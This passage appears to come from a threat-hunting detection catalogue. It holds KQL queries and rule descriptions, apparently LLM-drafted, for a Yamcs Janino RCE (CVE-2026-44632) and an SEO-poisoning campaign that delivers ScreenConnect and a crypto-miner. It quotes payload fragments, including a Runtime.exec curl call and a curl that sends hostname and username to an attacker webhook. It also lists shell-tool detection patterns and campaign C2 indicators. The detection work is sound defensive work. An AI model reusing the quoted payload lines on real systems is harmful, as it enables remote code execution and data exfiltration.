        | where SHA256 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c") or SHA1 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c") or MD5 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c") or SHA1 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c") or MD5 in~ ("a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["a2b6c7a9c4490df70de3cdbfa5fc801a3e1cf6a872749259487e354de2876b7c"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).

[LLM] Yamcs JVM spawning OS shell/interpreter (Janino RCE via CVE-2026-44632) Exploitation High
Hunts the Yamcs Java mission-control process (java/yamcsd) spawning a Unix shell or command interpreter (bash/sh/curl/wget/python/nc) as a child. The Janino SimpleCompiler RCE compiles attacker-supplied algorithm text containing java.lang.Runtime.getRuntime().exec(), so a JVM-parent → shell-child tree on a Yamcs host is the core post-exploitation signal that the injected algorithm executed. Rationale: Anchored on the article's PoC payload `java.lang.Runtime.getRuntime().exec(new String[]{"bash","-c","curl ..."})` — the deterministic post-exploitation artefact is a Yamcs JVM (java/yamcsd) parent forking a shell/network tool, which a mission-control JVM almost never does legitimately. Cross-checked against GHSA-524g-x36v-9wm6 and CIRCL Vulnerability-Lookup. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://vulnerability.circl.lu/vuln/ghsa-524g-x36v-9wm6 • https://github.com/yamcs/yamcs

[LLM] Yamcs MDB algorithm override PATCH with Java Runtime payload Delivery Medium
Hunts authenticated HTTP PATCH requests to the Yamcs Mission Database algorithm override endpoint (/api/mdb/<instance>/<processor>/algorithms/...), the exact exploitation vector for CVE-2026-44632. High-fidelity when the request body / URL contains java.lang.Runtime or Runtime.getRuntime, indicating an injected OS-command payload rather than a benign algorithm edit. Rationale: Uses the exact endpoint shape from the PoC curl — `PATCH /api/mdb/<instance>/<processor>/algorithms/...` with `action:SET` and a `text` field embedding `java.lang.Runtime.getRuntime().exec()`. URL+method alone is a benign admin action so this is hunting-tier; the body/Message match on Runtime.getRuntime is what elevates fidelity where the WAF logs request bodies. Defender has no inbound web-server table for the Yamcs JVM, so defender_kql is intentionally empty. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://docs.yamcs.org/yamcs-server-manual/mdb/algorithm-definitions/
ATT&CKT1190 T1059

| where (Message has_any ("java.lang.Runtime","Runtime.getRuntime",".exec(") or DeviceCustomString1 has_any ("java.lang.Runtime","Runtime.getRuntime"))
   or RequestURL has "/algorithms/"
| project TimeGenerated, SourceIP, SourceUserName, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, Message
| order by TimeGenerated desc

[LLM] Outbound recon callback from Yamcs host (curl/shell child of JVM to public IP) Command & Control High
Hunts external network connections initiated by a shell or download tool (curl/wget/bash/python/nc) whose parent is the Yamcs JVM. CVE-2026-44632's PoC payload exfiltrates host recon via `curl https://<webhook>/$(hostname)_$(whoami)`, so a java-parented curl reaching a public IP confirms successful RCE and data egress. Rationale: Targets the PoC's egress shape — a curl/shell child of the Yamcs JVM beaconing host recon (`$(hostname)_$(whoami)`) to an attacker webhook over a public IP. Distinct network pivot from UC1's process tree. Sentinel ASIM ImNetworkSession carries no initiating-parent-process lineage so sentinel_kql is left empty; SPL Network_Traffic lacks parent lineage and is therefore a coarser app-based approximation — the Defender/Falcon EDR queries are the authoritative form. Cross-checked against: • https://github.com/advisories/GHSA-524g-x36v-9wm6 • https://vulnerability.circl.lu/vuln/ghsa-524g-x36v-9wm6

[LLM] ZIP delivery from gleeze.com look-alike utility download sites (SEO/AI poisoning) Delivery High
Hunts browser-initiated ZIP downloads whose origin URL is a subdomain of the campaign's Dynu-hosted gleeze.com infrastructure (e.g. direct-download.gleeze.com/crystaldiskinfo). This is the initial-access foothold for the cryptojacking chain that impersonates CrystalDiskInfo, HWMonitor, FurMark, DDU, K-Lite and PDFgear. Rationale: Anchors on the article's named distribution infra (gleeze.com subdomains, directdownload.icu) corroborated by an ANY.RUN run of direct-download.gleeze.com/crystaldiskinfo and gbhackers/The Register reporting; 150+ subdomains all funnel the same ZIP, so the parent domain is a stable pivot. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/ • https://any.run/report/6468f63767212e0c1e4fe5d0eaa9137c4547ff173dc55b2d7fb1b2e445802d45/48172448-8ac9-4c17-8fef-bbf0c9a3d1e3 • https://www.theregister.com/2026/04/10/cpuid_site_hijacked/

[LLM] DLL side-loading of autorun.dll by spoofed hardware-utility executables Installation High
Detects the legitimate (but trojanized-bundle) utility binaries — CrystalDiskInfo, HWMonitor, FurMark, DDU, PDFgear, K-Lite — loading a malicious autorun.dll from a user-writable folder via DLL search-order side-loading. Nine distinct autorun.dll variants were observed across the campaign; the module name + non-system host pairing is the high-fidelity signal. Rationale: Uses the exact malicious module name (autorun.dll) plus the article's enumerated host utilities; the image-load relationship from a user-writable path distinguishes side-loading from normal program startup. Datadog/Falcon use the autorun.dll file-write as a proxy since their FDR/Sysmon image-load fields aren't in scope here. Sentinel left blank: no standard Sentinel table carries Sysmon EID 7 image-load metadata in this tenant. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/ • https://cyberpress.org/seo-attack-deploys-rmm/

[LLM] msiexec silently installing masqueraded vcredist_x64.dll (ScreenConnect packaged installer) Installation High
Detects autorun.dll's second stage: msiexec.exe silently installing a DLL named vcredist_x64.dll that poses as the Visual C++ Redistributable but is actually a packaged ScreenConnect (ConnectWise Control) installer. The DLL-as-MSI-payload plus silent flags is the article-specific behaviour. Rationale: Anchors on the verbatim payload name vcredist_x64.dll passed to msiexec — a DLL is never a normal MSI target, making this near-zero-FP. Corroborated by gbhackers ('Microsoft Binary to Install RMM Tool') and cyberpress describing msiexec/MSI abuse to deploy the RMM. Cross-checked against: • https://gbhackers.com/seo-poisoning-attack/ • https://cyberpress.org/seo-attack-deploys-rmm/

[LLM] Unauthorized ScreenConnect client beaconing to directdownload.icu:8041 / 193.42.11.108 Command & Control High
Detects the abused ScreenConnect.ClientService.exe launched with the attacker's relay parameters (h=directdownload.icu, p=8041, session GUID b31c5795-9b66-4d20-ac8d-aad60d05852a, c=Crystaldeskinfo) or beaconing to C2 IP 193.42.11.108. This establishes the persistent remote access that could pivot to data theft or ransomware. Rationale: Uses the verbatim ScreenConnect service-invocation string from the article (relay host directdownload.icu, port 8041, exact session GUID, Crystaldeskinfo custom property) — these are unique to the attacker tenant, so any match is a confirmed compromise; the C2 IP 193.42.11.108 provides a network corroborator. Cross-checked against: • https://www.scworld.com/brief/malware-crafted-through-connectwise-screenconnect-exploitation • https://gbhackers.com/seo-poisoning-attack/

[LLM] SimpleRunPE / RuntimeHost.exe dropped to hidden D3F4E2A1 install folder Installation High
Detects the process-hollowing dropper (SimpleRunPE.exe, SHA256 1b2555b0...) and its self-copy RuntimeHost.exe written into the campaign's hidden install folder keyed by identifier D3F4E2A1 (incl. fallback %LocalAppData%\Microsoft\Windows\Caches\D3F4E2A1). Also pivots on the embedded PDB string and the C2 IP-resolved binary hash. Rationale: Combines the article's campaign identifier D3F4E2A1 (used as folder name, mutex Global\D3F4E2A1_Svc, and exclusion path), the dropper/persistence filenames, and the verbatim SHA256 — all unique strings that won't collide with legitimate software. PDB path (Simple-RunPE-Process-Hollowing-RUNPE) ties to the public PoC fork. Cross-checked against: • https://github.com/Watermwo/Simple-RunPE-Process-Hollowing • https://malware.news/t/from-poisoned-search-results-to-gpu-mining-a-cryptojacking-campaign-abusing-screenconnect-and-microsoft-net-utilities/107339
